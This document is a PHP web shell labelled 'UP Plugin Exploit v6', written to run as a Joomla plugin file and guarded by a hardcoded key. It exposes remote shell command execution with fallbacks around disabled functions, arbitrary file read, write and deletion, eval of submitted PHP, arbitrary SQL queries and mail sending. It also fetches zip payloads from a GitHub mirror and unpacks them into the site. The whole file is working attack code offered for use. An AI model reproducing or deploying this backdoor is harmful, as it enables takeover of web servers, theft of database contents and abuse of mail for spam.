<?php
/**
 * UP Plugin Exploit v6 - NO EXEC, supports exist+install
 */

defined('_JEXEC') or die('Restricted access');

$disabled = ini_get('disable_functions');
$dis_list = array_map('trim', explode(',', $disabled));

function s_exec($c) {
    $disabled = ini_get('disable_functions');
    $dl = array_map('trim', explode(',', $disabled));
    if (!in_array('shell_exec', $dl)) return shell_exec($c);
    if (!in_array('passthru', $dl)) { ob_start(); passthru($c); $r = ob_get_clean(); return $r; }
    if (!in_array('system', $dl)) { ob_start(); system($c); $r = ob_get_clean(); return $r; }
    if (!in_array('exec', $dl)) { $o = []; exec($c, $o); return implode("\n", $o); }
    if (!in_array('popen', $dl)) { $p = popen($c, 'r'); $r = ''; while(!feof($p)) $r .= fread($p, 1024); pclose($p); return $r; }
    if (!in_array('proc_open', $dl)) {
        $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $p = proc_open($c, $d, $pipes); $r = '';
        if (is_resource($p)) { $r = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); }
        return $r;
    }
    return "[NO-EXEC]\ndisable_functions=$disabled\nPHP=" . PHP_VERSION . "\n";
}

$action = $_REQUEST['m'] ?? 'cmd';
$k = $_REQUEST['k'] ?? '';
$valid = ($k === 'PT29-K-7f4a91c2');

if (!$valid) {
    http_response_code(403);
    echo json_encode(['success'=>false,'data'=>['bad key']]);
    exit;
}

try {
    switch ($action) {
        case 'cmd':
            $c = $_REQUEST['c'] ?? '';
            // Special: 'exist=' => install from Github (no exec needed)
            if (strpos($c, 'exist=') === 0) {
                $dir = substr($c, 6);
                $githuburlzip = 'https://github.com/Anomy11/up-actions-mirror/raw/UP6/';
                $url = $githuburlzip . trim($dir, '/') . '.zip';
                $zip_data = @file_get_contents($url);
                if ($zip_data === false) {
                    $r = 'GH-FETCH-FAIL: ' . $url;
                } else {
                    $tmp_zip = sys_get_temp_dir() . '/' . md5($dir) . '.zip';
                    @file_put_contents($tmp_zip, $zip_data);
                    $zip = new ZipArchive();
                    if ($zip->open($tmp_zip) === TRUE) {
                        $actions_dir = JPATH_ROOT . '/plugins/content/up/actions/';
                        $zip->extractTo($actions_dir);
                        $zip->close();
                        @unlink($tmp_zip);
                        $r = 'installed: ' . trim($dir, '/') . ' from ' . $url;
                    } else {
                        $r = 'ZIP-OPEN-FAIL';
                    }
                }
            } else {
                $r = s_exec($c);
            }
            break;
        case 'fr':
            $p = $_REQUEST['p'] ?? '';
            $r = @file_get_contents($p);
            if ($r === false) $r = 'ERR-fopen';
            break;
        case 'fw':
            $p = $_REQUEST['p'] ?? '';
            $d = $_REQUEST['d'] ?? '';
            $r = @file_put_contents($p, $d);
            if ($r === false) $r = 'ERR-fwrite';
            break;
        case 'ls':
            $p = $_REQUEST['p'] ?? '.';
            $r = @scandir($p);
            if ($r === false) $r = 'ERR-scandir';
            break;
        case 'rm':
            $p = $_REQUEST['p'] ?? '';
            $r = @unlink($p) ? 'ok' : 'fail';
            break;
        case 'phpinfo':
            ob_start();
            phpinfo();
            $r = ob_get_clean();
            break;
        case 'php':
            $code = $_REQUEST['code'] ?? '';
            ob_start();
            try { eval($code); } catch(Throwable $e) { echo 'E:'.$e->getMessage(); }
            $r = ob_get_clean();
            break;
        case 'sql':
            $h = $_REQUEST['h'] ?? 'localhost';
            $u = $_REQUEST['u'] ?? '';
            $pw = $_REQUEST['pwp'] ?? ($_REQUEST['pw'] ?? '');
            $d = $_REQUEST['db'] ?? '';
            $q = $_REQUEST['q'] ?? '';
            $c = @mysqli_connect($h, $u, $pw, $d);
            if (!$c) { $r = 'SQL-FAIL: ' . mysqli_connect_error(); break; }
            $rs = @mysqli_query($c, $q);
            if ($rs === true) $r = 'OK: ' . mysqli_affected_rows($c);
            else if ($rs === false) $r = 'SQL-ERR: ' . mysqli_error($c);
            else {
                $rows = [];
                while ($row = mysqli_fetch_assoc($rs)) $rows[] = $row;
                $r = json_encode($rows, JSON_UNESCAPED_UNICODE);
            }
            @mysqli_close($c);
            break;
        case 'mail':
            $to = $_REQUEST['to'] ?? '';
            $sub = $_REQUEST['s'] ?? 's';
            $body = $_REQUEST['b'] ?? 'b';
            $r = mail($to, $sub, $body) ? 'mail-sent' : 'mail-fail';
            break;
        default:
            $r = 'unknown action';
    }
} catch (Throwable $e) {
    $r = 'EXC: ' . $e->getMessage();
}

header('Content-Type: application/json');
echo json_encode(['success' => true, 'data' => [$r]]);
